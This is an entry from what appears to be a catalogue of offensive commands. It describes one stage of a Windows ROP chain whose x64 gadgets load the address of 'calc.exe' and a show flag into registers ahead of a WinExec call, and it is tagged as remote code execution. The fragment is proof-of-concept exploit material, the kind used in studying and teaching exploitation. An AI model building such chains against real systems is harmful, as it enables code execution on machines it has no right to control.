---
data: >-
  pop rcx ; Load address of \"calc.exe\" into rcx; 0x9519000\nret;\npop rdx ;
  Load SW_SHOWNORMAL into rdx\nret ; 0x1 SW_SHOWNORMAL = 1\nadd rsp, 0x20 ;
  Align stack\nadd rax, rbx ;
tags:
  - rop
  - rce
type: command
output: Stack aligned and parameters set.
executor: asm
platforms:
  - Windows
id: afef6cc4-d3ce-43f2-a599-99b107b57823
created_at: '2025-12-13T23:55:06.744Z'
updated_at: '2025-12-13T23:55:06.744Z'
verified: false
validated: true
submitted: true
---
# rop-stage3-prepare-params

## Command

```asm
pop rcx ; Load address of "calc.exe" into rcx; 0x9519000
ret;
pop rdx ; Load SW_SHOWNORMAL into rdx
ret ; 0x1 SW_SHOWNORMAL = 1
add rsp, 0x20 ; Align stack
add rax, rbx ;
```

## Description

Prepares rcx (cmd addr) and rdx (show flag) for WinExec call.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| rcx | Address of command string (0x9519000) | Yes |
| rdx | SW_SHOWNORMAL (1) | Yes |

## Examples

### Basic Usage

Follows resolution stage.

## Expected Output

Registers set, stack aligned.

## Related

- [[commands/rop-stage4-call-winexec]]
